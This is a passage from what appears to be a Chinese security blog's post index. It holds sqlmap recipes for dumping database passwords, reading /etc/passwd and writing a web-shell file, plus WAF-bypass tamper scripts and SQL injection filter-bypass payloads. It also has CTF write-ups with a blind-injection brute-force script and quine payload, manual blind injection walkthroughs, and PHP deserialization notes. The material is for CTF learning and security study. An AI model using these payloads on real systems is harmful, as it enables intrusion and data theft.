&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;简单的注入流程 :1.读取数据库版本，当前用户，当前数据库 sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 2.判断当前数据库用户权限 sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 3.读取所有数据库用户或指定数据库用户的密码 sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 4.获取所有数据库 sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 5.获取指定数据库中的所有表 sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 6.获取指定数据库名中指定表的字段 sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 7.获取指定数据库名中指定表中指定字段的数据 sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 8.file-read读取web文件 sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 9.file-write写入文件到web sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试\n\nsqlmap 常用绕过脚本使用方法 --tamper xxx.py\napostrophemask.py                         用UTF-8全角字符替换单引号字符apostrophenullencode.py                   用非法双字节unicode字符替换单引号字符appendnullbyte.py                         在payload末尾添加空字符编码base64encode.py                           对给定的payload全部字符使用Base64编码between.py                                分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”bluecoat.py              在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”chardoubleencode.py      对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）charencode.py            对给定的payload全部字符使用URL编码（不处理已经编码的字符）charunicodeencode.py     对给定的payload的非编码字符使用Unicode 编码（不处理已经编码的字符）concat2concatws.py  用“CONCAT_WS(MID(CHAR(0), 0, 0), A,B)”替换像“CONCAT(A, B)”的实例equaltolike.py          用“LIKE”运算符替换全部等于号“=”greatest.py             用“GREATEST”函数替换大于号“&gt;”halfversionedmorekeywords.py         在每个关键字之前添加MySQL注释ifnull2ifisnull.py                   用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例lowercase.py                         用小写值替换每个关键字字符modsecurityversioned.py              用注释包围完整的查询modsecurityzeroversioned.py          用当中带有数字零的注释包围完整的查询multiplespaces.py                    在SQL关键字周围添加多个空格nonrecursivereplacement.py           用representations替换预定义SQL关键字，适用于过滤器overlongutf8.py                      转换给定的payload当中的所有字符percentage.py                        在每个字符之前添加一个百分号randomcase.py                        随机转换每个关键字字符的大小写randomcomments.py                    向SQL关键字中插入随机注释securesphere.py                      添加经过特殊构造的字符串sp_password.py向payload末尾添加“sp_password” for automatic obfuscation from DBMS logsspace2comment.py                     用“//”替换空格符**space2dash.py                     用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符space2hash.py                     用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2morehash.py                 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2mssqlblank.py               用一组有效的备选字符集当中的随机空白符替换空格符space2mssqlhash.py                用磅注释符“#”其次是一个换行符替换空格符space2mysqlblank.py               用一组有效的备选字符集当中的随机空白符替换空格符space2mysqldash.py                用破折号注释符“–”其次是一个换行符替换空格符space2plus.py                     用加号“+”替换空格符space2randomblank.py              用一组有效的备选字符集当中的随机空白符替换空格符unionalltounion.py                用“UNION SELECT”替换“UNION ALL SELECT”unmagicquotes.py                  用一个多字节组合%bf%27和末尾通用注释一起替换空格符varnish.py                        添加一个HTTP头“X-originating-IP”来绕过WAFversionedkeywords.py              用MySQL注释包围每个非函数关键字versionedmorekeywords.py          用MySQL注释包围每个关键字xforwardedfor.py                  添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF\n\n","categories":["Web"],"tags":["sql注入","sqlmap"]},{"title":"find_it","url":"/find-it/","content":"2021-第四届红帽杯网络安全大赛-Web-find_it\n\n首先进项端口扫描dirsearch\n\n\n\n\nrobots.txt 文件内容\n\n\n\n1ndexx.php 打开404 ，尝试打开备份文件.1ndexx.php.swp\n\n\n\n查看源代码\n\n\n\n直接访问hack.php无法访问 show_source()读取文件：\n\n?code=&lt;?php show_source(__FILE__);?&gt;\n\n\nhttp://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/index.php?code=&lt;?php show_source(__FILE__);?&gt;\nhttp://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/hack.php\n\n\n关于show_source()show_source() 函数对文件进行语法高亮显示。本函数是 highlight_file() 的别名12\n\n关于.swp缓存文件文件泄露(.swp备份文件):非正常关闭vi&#x2F;vim编辑器时会生成一个.swp文件 \n调用这类的隐藏文件的时候，需要在最前面加.\n\n官方WriteUpfind_it | CTFHub\n","categories":["CTF","ctfhub"],"tags":["web","备份文件泄露"]},{"title":"sql注入绕过技巧","url":"/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/","content":"sql注入绕过技巧1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）：　　两个空格代替一个空格，用Tab代替空格，%a0=空格：\n%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/\n\n 最基本的绕过方法，用注释替换空格：\n/*  注释 */\n\n\n使用浮点数：\nselect * from users where id=8E0union select 1,2,3select * from users where id=8.0 select 1,2,3\n\n2.括号绕过空格：　　如果空格被过滤，括号没有被过滤，可以用括号绕过。\n　　在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。\n例如：\nselect(user())from dual where(1=1)and(2=2)\n\n　　这种过滤方法常常用于time based盲注,例如：\n?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23\n\n（from for属于逗号绕过下面会有）\n　　上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。\n3.引号绕过（使用十六进制）　　会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：\nselect column_name  from information_schema.tables where table_name=&quot;users&quot;\n\n　　这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。　　users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：\nselect column_name  from information_schema.tables where table_name=0x7573657273\n\n4.逗号绕过（使用from或者offset）：　　在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：\nselect substr(database() from 1 for 1);select mid(database() from 1 for 1);\n\n　　使用join：\nunion select 1,2     #等价于union select * from (select 1)a join (select 2)b\n\n　　使用like：\nselect ascii(mid(user(),1,1))=80   #等价于select user() like &#x27;r%&#x27;\n\n　　对于limit可以使用offset来绕过：\nselect * from news limit 0,1# 等价于下面这条SQL语句select * from news limit 1 offset 0\n\n5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：使用greatest()、least（）：（前者返回最大值，后者返回最小值）　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。　　最常见的一个盲注的sql语句：\nselect * from users where id=1 and ascii(substr(database(),0,1))&gt;64\n\n　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。　　那么上面的这条sql语句可以使用greatest变为如下的子句:\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\n使用between and：  between a and b：\nbetween 1 and 1; 等价于 &#x3D;1\n6.or and xor not绕过：and=&amp;&amp;  or=||   xor=|   not=!\n\n7.绕过注释符号（#，–(后面跟一个空格））过滤：id=1&#x27; union select 1,2,3||&#x27;1\n\n　　最后的or ‘1闭合查询语句的最后的单引号，或者：\nid=1&#x27; union select 1,2,&#x27;3\n\n8.&#x3D;绕过：　　使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;\n9.绕过union，select，where等：（1）使用注释符绕过：　　常用注释符：\n//，-- , /**/, #, --+, -- -, ;,%00,--a\n\n　　用法：\nU/**/ NION /**/ SE/**/ LECT /**/user，pwd from user\n\n（2）使用大小写绕过：id=-1&#x27;UnIoN/**/SeLeCT\n\n（3）内联注释绕过：id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#\n\n（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：id=-1&#x27;UNIunionONSeLselectECT1,2,3–-\n\n10.通用绕过（编码）：　　如URLEncode编码，ASCII,HEX,unicode编码绕过：\nor 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。\n\n11.等价函数绕过：hex()、bin() ==&gt; ascii()sleep() ==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr() ==&gt; substring()@@user ==&gt; user()@@datadir ==&gt; datadir()举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　或者：substr((select &#x27;password&#x27;),1,1) = 0x70strcmp(left(&#x27;password&#x27;,1), 0x69) = 1strcmp(left(&#x27;password&#x27;,1), 0x70) = 0strcmp(left(&#x27;password&#x27;,1), 0x71) = -1\n\n12.宽字节注入：　　过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。\n　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：\n　　（1）%df 吃掉 \\ 具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：\nid=-1%df%27union select 1,user(),3--+\n\n　　（2）将 &#39; 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。\n一般产生宽字节注入的PHP函数：  1.replace（）：过滤 ‘ \\ ，将 ‘ 转化为 &#39; ，将 \\  转为 \\，将 “ 转为 &quot; 。用思路一。\n  2.addslaches()：返回在预定义字符之前添加反斜杠（\\）的字符串。预定义字符：’ , “ , \\ 。用思路一\n（防御此漏洞，要将 mysql_query 设置为 binary 的方式）\n　 　3.mysql_real_escape_string()：转义下列字符：\n\\x00     \\n     \\r     \\     &#x27;     &quot;     \\x1a\n\n（防御，将mysql设置为gbk即可）\nPCRE绕过：union/*&#x27;+&#x27;a&#x27;*1000001+&#x27;*/select\n\n","categories":["Web"],"tags":["sql注入","绕过"]},{"title":"xray-webscan使用教程","url":"/xray-webscan%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","content":"xray-webscan快速使用扫描一个站点最简单的方式是直接调用，扫描一个指定的站点，如：\n./xray webscan --basic-crawler http://example.com/\n\n\n这可能是最简单最常用的一个功能，就是太长了，体验不太友好，建议常用的同学可以 alias xray=&quot;/path/xray webscan --basic-crawler&quot;\n\n指定扫描输出不指定输出时，默认输出到控制台的标准输出中，可以做管道处理，也可以选择输出为文件，如：\n./xray webscan --url http://example.com/ --json-output report.json\n\n不同参数对应不同的输出方式：\n\n无参数：输出到控制台的标准输出\n--text-output：输出到文本文件中\n--json-output：输出到 JSON 文件中\n--html-output：输出到 HTML 文件中\n\n基于代理的被动扫描xray 可以通过类似 Burp 的方式启动，利用 HTTP 代理来抓包扫描，如：\n./xray webscan --listen 127.0.0.1:7777\n\n如果运行没报任何错就可以设置浏览器 HTTP 代理为 127.0.0.1:7777 了，关于如何设置浏览器代理，请打开百度搜索 “浏览器设置代理”。\n代理设置 OK 以后就可以启动代理扫描了，这时候我们打来浏览器尽情冲浪吧，理论上我们的鼠标点到哪 xray 就能扫到哪。\n需要注意一下的是，很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的 ca.crt 证书，关于如何导入 CA 证书，请打开百度搜索 “安装CA证书”。\n➜   lsca.crt      ca.key      config.yaml xray\n\n高级姿势指定扫描插件使用 --plugins 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如：\n./xray webscan --plugins cmd_injection --url http://example.com/\n\n目前提供的插件列表如下：\n\nSQL 注入检测 (key: sqldet)支持报错注入、布尔注入和时间盲注等\nXSS 检测（key: xss）支持扫描反射型、存储型 XSS\n命令&#x2F;代码注入检测 (key: cmd_injection)支持 shell 命令注入、PHP 代码执行、模板注入等\n目录枚举 (key: dirscan)检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件\n路径穿越检测 (key: path_traversal)支持常见平台和编码\nXML 实体注入检测 (key: xxe)支持有回显和反连平台检测\nPOC 管理 (key: phantasm)默认内置部分常用的 POC，用户可以根据需要自行构建 POC 并运行。可参考：POC 编写文档\n文件上传检测 (key: upload)支持检测常见的后端服务器语言的上传漏洞\n弱口令检测 (key: brute_force)支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典\nJSONP 检测 (key: jsonp)检测包含敏感信息可以被跨域读取的 jsonp 接口\nSSRF 检测 (key: ssrf)ssrf 检测模块，支持常见的绕过技术和反连平台检测\n基线检查 (key: baseline)检测低 SSL 版本、缺失的或错误添加的 http 头等\n任意跳转检测 (key: redirect)支持 HTML meta 跳转、30x 跳转等\nCRLF 注入 (key: crlf_injection)检测 HTTP 头注入，支持 query、body 等位置的参数\n…\n\n只扫描一个 URLxray 还提供了方便的只扫描一个 URL 的方式，如：\n./xray webscan --url http://example.com/ --json-output out.json\n","categories":["利其器"],"tags":["工具","xray"]},{"title":"yet_another_mysql_injection","url":"/yet-another-mysql-injection/","content":"2021-第五空间智能安全大赛-Web-yet_another_mysql_injection\n初始界面\n\n\n查看源代码发现源码文件  &#x2F;?source\n&lt;?phpinclude_once(&quot;lib.php&quot;);function alertMes($mes,$url)&#123;    die(&quot;&lt;script&gt;alert(&#x27;&#123;$mes&#125;&#x27;);location.href=&#x27;&#123;$url&#125;&#x27;;&lt;/script&gt;&quot;);&#125;function checkSql($s) &#123;    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123;        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);    &#125;&#125;if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123;    $username=$_POST[&#x27;username&#x27;];    $password=$_POST[&#x27;password&#x27;];    if ($username !== &#x27;admin&#x27;) &#123;        alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);    &#125;    checkSql($password);    $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;    $user_result=mysqli_query($con,$sql);    $row = mysqli_fetch_array($user_result);    if (!$row) &#123;        alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);    &#125;    if ($row[&#x27;password&#x27;] === $password) &#123;    die($FLAG);    &#125; else &#123;    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);  &#125;&#125;if(isset($_GET[&#x27;source&#x27;]))&#123;  show_source(__FILE__);  die;&#125;?&gt;\n\n\n源码分析\n\n\nalertMes($mes, $url)：该函数接受两个参数，$mes（要显示的消息）和$url（显示消息后要重定向的URL）。它使用JavaScript输出一个包含给定消息的警告弹窗，然后将用户重定向到指定的URL。\ncheckSql($s)：该函数接受一个参数$s（一个字符串），并检查其中是否包含任何可疑的SQL关键词或字符，这可能表明试图进行SQL注入攻击。如果发现任何可疑关键词或字符，它将使用alertMes函数显示警告，并将用户重定向到 “index.php”。\n\nfunction checkSql($s) &#123;    if(preg_match(&quot;/regexp|between|in|flag| =| &gt;|&lt; |and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ /i&quot;,$s))&#123;        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);    &#125;&#125;\n\n\n模式分隔符后的”i”标记这是一个大小写不敏感的搜索\n\nsleep 可以用benchmark代替&lt;,&gt; 可以用least(),greatest()代替=,in 可以用like代替substr 可以用mid代替空格 可以用/**/代替\n\n\n注入脚本测试\n\nimport requestsimport timechar = &#x27;01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&amp;%&#x27;def password():    flag = &#x27;&#x27;    url = &#x27;http://challenge-f48e2f483110ea2f.sandbox.ctfhub.com:10800/index.php&#x27;    while True:        for i in char:            payload = &#123;&quot;username&quot;: &quot;admin&quot;,                       &quot;password&quot;: f&quot;1&#x27;or/**/password/**/like/**/&#x27;&#123;flag + i&#125;%&#x27;#&quot;                       &#125;            # print(payload)            res = requests.post(url=url, data=payload)            if &quot;something wrong&quot; not in res.text:                flag += i                print(flag)                break            if &quot;ctfhub&quot; in res.text:                print(&quot;game over&quot;)                break            elif &quot;~&quot; in i:                print(&quot;just ok&quot;)                returnif __name__ == &#x27;__main__&#x27;:    password()\n\n运行结果 o2cqmlyo0kpjkdyocm8cfbygzaievxbw       just ok\n通过用户名 admin 密码 o2cqmlyo0kpjkdyocm8cfbygzaievxbw 登录 还是显示错误 \n\n通过网上writeup 发现\n\n使用了 quine注入\n1.首先先了解一下replace()函数\n\nreplace(object,search,replace)\n把object对象中出现的的search全部替换成replace\n\n注入的payload:\n1&#x27;/**/union/**/select/**/replace(replace(&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#\n\nCHAR(34)=&quot;       CHAR(39)=&#39;        CHAR(33)=!         char(46)=.\nquine注入\n核心思想：\nsql语句执行的结果等于sql语句本身\n\n即利用sql执行的结果等于它本身绕过判断：\n$row[‘password’] &#x3D;&#x3D;&#x3D; $password\n1&#x27; union select replace(replace(&#x27;1&quot; union select replace(replace(&quot;.&quot;,&quot;,&#x27;) ,., &quot;.&quot;)#&#x27;,&quot;, &#x27;), ., &#x27;1 union select replace(replace(&quot;.&quot;, &quot;,&#x27;), ., &quot;.&quot;)#&#x27;)#\n\n","categories":["CTF","ctfhub"],"tags":["web","sql注入"]},{"title":"例题(手工注入)","url":"/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/","content":"例题(手工注入)例题1：报错注入(ctfhub)\n报错注入：首先想到 updatexml \n1 union select updatexml(1,concat(0x7e,(select database()),0x7e),1)\n\n\n此时查询到数据库名：sqli\n1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;sqli&quot;),0x7e),1)\n\n\n查询到表名：flag 进而查询列名：\n1 union select updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;),0x7e),1)\n\n\n最后查询 列名为 flag 的信息\n1 union select updatexml(1,concat(0x7e,(select flag from flag),0x7e),1)\n\n\n例题2：布尔盲注(ctfhub)\n\nsubstr(str,from,length):返回从下标为from截取长度为length的str子串。其中，首字符下标为1\nlength(str):返回str串长度\n\n\n1. 首先   爆数据库名长度 使用length(database()) = i 获取数据库名的长度\n1 and length(database())=1......1 and length(database())=4\n\n\n2. 根据数据库名长度爆库名 使用  substr(database(),i,1)\n?id=1 and substr(database(),1,1)=‘a’#query_error...?id=1 and substr(database(),1,1)=‘s’#query_success#库名第一个字符是s...?id=1 and substr(database(),4,1)=‘i’#query_success#库名第四个字符是i#库名是sqli\n\n\n3. 获取数据库内的表数量，使用mysql的查询语句select COUNT(*)。同样，要一个1到无穷的循环\n?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=1#query_error?id=1 and (select COUNT(*) from information_schema.tables where table_schema=database())=2#query_success#当前库sqli有2张表\n\n\n4. 使用limit i ,1限定是第几张表，内嵌循环j从1到无穷（穷举所有表名长度可能性）尝试获取每个表的表名长度\n?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=1#query_error...?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=4#query_success#当前库sqli的第一张表表名长度为4...?id=1 and length(select table_name from information_schema.tables where table_schema=database() limit 1,1)=4#query_success#当前库sqli的第二张表表名长度为4#当前库sqli有两张表’news’和’flag‘，表名长度均为4\n\n\n\n表名长度爆表名substr((select…limit i,1),j,1)\n?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;#query_error...?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;n&#x27;#query_success#当前库sqli的第一张表表名第一个字符是n...?id=1 and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1)=&#x27;g&#x27;#query_success#当前库sqli的第二张表表名的第四个字符是g#当前库sqli有两张表’news‘和‘flag’\n\n\n对表爆列数量\n\n?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;)=1#query_error?id=1 and (select COUNT(*) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;)=2#query_success#当前库sqli表flag的列数为2\n\n\n根据表名和列数量爆列名长度\n\n?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1)=1#query_error...?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1)=4#query_success#当前库sqli表flag的第一列列名长度为4...?id=1 and length(select columns from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1)=4#query_success#当前库sqli表flag的第二列列名长度为4#当前库sqli表flag有两个列‘id’和‘flag’，列名长度为2和4\n\n\n根据列名长度爆列名\n\n?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),1,1)=&#x27;a&#x27;#query_error...?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1),1,1)=&#x27;i&#x27;#query_success#当前库sqli表flag的第一列列名第一个字符为i...?id=1 and substr((select columns_name from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 1,1),4,1)=&#x27;g&#x27;#query_success#当前库sqli表flag的第二列列名第四个字符为g#当前库sqli表flag有两个列‘id’和‘flag’\n\n\n根据列名爆数据\n\n?id=1 and substr((select flag from sqli.flag),1，1)=“a”#query_error...?id=1 and substr((select flag from sqli.flag),1，1)=“c”#query_success#flag的第一个字符是c...?id=1 and substr((select flag from sqli.flag),i，1)=“&#125;”#query_success#flag的最后一个字符是&#125;#这里的j是计数变量j从1自增1得到的值#出循环即可得到flag\n\n例题3：时间盲注(ctfhub)时间盲注和上一篇布尔盲注一样都是盲注，都需要借助length,ascii,substr这些神奇的函数来猜测各项信息。它们的差别是猜测成功的依据。\n布尔盲注的话如果查询有结果，一般会有一个success_flag,比如在上一题里就会返回query successfully。\n但是时间盲注不一样，它不光不给你查询的内容的回显，不给你报错信息，甚至连布尔盲注里的success_flag也不给。时间盲注相当于自行创造出了一个success_flag，将查询成功的情况与查询失败的情况做了区分。\n\nsubstr(str,from,length):返回从下标为from截取长度为length的str子串。其中，首字符下标为1\n\n\n首先爆破数据库长度\n\n1 and if(length(database())=4,sleep(3),1)\n\n\n\n爆破数据库名字\n\n1 and if(ascii(substr(database(),1,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),1,1))=115,sleep(3),1)\tascii(s)=1151 and if(ascii(substr(database(),2,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),2,1))=113,sleep(3),1)\tascii(q)=1131 and if(ascii(substr(database(),3,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),3,1))=108,sleep(3),1)\tascii(l)=1081 and if(ascii(substr(database(),4,1))&gt;110,sleep(3),1)1 and if(ascii(substr(database(),4,1))=105,sleep(3),1)\tascii(i)=105......不断调整ASCII码的范围逐渐得到数据库名称为sqli\n\n\n\n爆破数据库中表的数量\n\n1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(3),1)\n\n\n\n爆破数据库中的各表名\n\n1 and if(ascii(substr((select table_name from information_schema.tables  where table_schema=database() limit 0,1),1,1))=110,sleep(3),1)  ascii(n)=1103秒后响应，说明第一张表的第一个字母为n依次得到表名为newslimit i,1  i 表示的即是第几张表1 and if(ascii(substr((select table_name from information_schema.tables  where table_schema=database() limit 1,1),1,1))=102,sleep(3),1)  ascii(f)=1023秒后响应，说明第二张表的第一个字母为f依次得到表名为flag\n\n\n\n爆破flag表的字段数\n\n1 and if((select count(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)=1,sleep(3),1)\n\n\n猜解字段名\n\n1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27;),1,1))=102,sleep(3),1)一样的套路，得到字段名为flag\n\n","categories":["Web"],"tags":["手工注入","报错注入","布尔盲注","时间盲注","ctfhub"]},{"title":"反序列化","url":"/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"反序列化PHP 反序列化serialize()serialize() —&gt; 函数用于序列化对象或数组，并返回一个字符串\n&lt;?phpClass test&#123;  public $a= &#x27;1&#x27;;  public $bb= 2;  public $ccc= True;&#125;$r= new test();echoserialize($r);$array_t= array(&quot;a&quot;=&gt;&quot;1&quot;,&quot;bb&quot;=&gt;&quot;2&quot;,&quot;ccc&quot;=&gt;&quot;3&quot;);echo serialize($array_t);\n\n\nO:4:”test”:3:{s:1:”a”;s:1:”1”;s:2:”bb”;i:2;s:3:”ccc”;b:1;}a:3:\n\n各个字符的意义 —&gt; 第一个字母O 代表 Object，a代表 array，s代表 string，,i表示数字\n类的属性有三种 private protected 和 public\nPHP 序列化的时候 private和 protected 变量会引入不可见字符%00，%00类名%00属性名 为private，%00*%00属性名 为protected，注意这两个 %00就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚\n&lt;?phpClass test&#123;  private $a= &quot;a&quot;;  protected $b= &quot;b&quot;;  public $c= &quot;c&quot;;&#125;$r= new test();echo serialize($r);echo urlencode(serialize($r));\n\n\nO:4:”test”:3:{s:7:”testa”;s:1:”a”;s:4:”*b”;s:1:”b”;s:1:”c”;s:1:”c”;}\nO%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D\n\nunserialize()unserialize() —&gt; 函数用于将通过 serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构\n&lt;?php$sites = array(&#x27;t1&#x27;, &#x27;tt2&#x27;, &#x27;ttt3&#x27;);$serialized_data = serialize($sites);#echo  $serialized_data;$unserialized_data = unserialize($serialized_data);print_r($unserialized_data);?&gt;\n\n\nArray(​ [0] &#x3D;&gt; t1​ [1] &#x3D;&gt; tt2​ [2] &#x3D;&gt; ttt3)\n\n常用魔法函数\n\n\n常用魔法函数\n定义\n\n\n\n__construct()\n在创建对象时候初始化对象，一般用于对变量赋初值。创建一个新的类时，自动调用该方法\n\n\n__destruct()\n和构造函数相反，当对象所在函数调用完毕后执行.即当一个类被销毁时自动调用该方法\n\n\n__toString()\n当对象被当做一个字符串使用时调用。\n\n\n__sleep()\n当调用serialize()函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这就允许对象在被序列化之前做任何清除操作\n\n\n__wakeup()\n反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数\n\n\n__invoke()\n把一个实例对象当作函数使用时自动调用\n\n\n__call()\n当调用对象中不存在的方法会自动调用该方法。\n\n\n__get()\n在调用私有属性的时候会自动执行\n\n\n__isset()\n在不可访问的属性上调用isset()或empty()触发\n\n\n__unset()\n在不可访问的属性上使用unset()时触发\n\n\n__wakeup() bypass\n在需要对__wakeup() 进行绕过的时候，可以让序列化结果中类属性的数值大于其真正的数值进行绕过，这个方式适用于PHP &lt; 5.6.25 和 PHP&lt; 7.0.10\n&lt;?phpClass User&#123;  public $name=&quot;Bob&quot;;    function __destruct()&#123;    echo&quot;nameis Bob &lt;/br&gt;&quot;;  &#125;    function __wakeup()&#123;    echo&quot;exit&lt;/br&gt;&quot;;  &#125;&#125;@var_dump(unserialize($_POST[&quot;u&quot;]));\n\nPOST 参数O:4:”User”:1:{s:4:”name”;s:3:”Bob”;}可以看到输出是：\nexitobject(User)[1] public &#x27;name&#x27; =&gt; string &#x27;Bob&#x27; (length=3)nameis Bob\n\n如果在某些情况下，不想让__wakeup() 执行，可以将 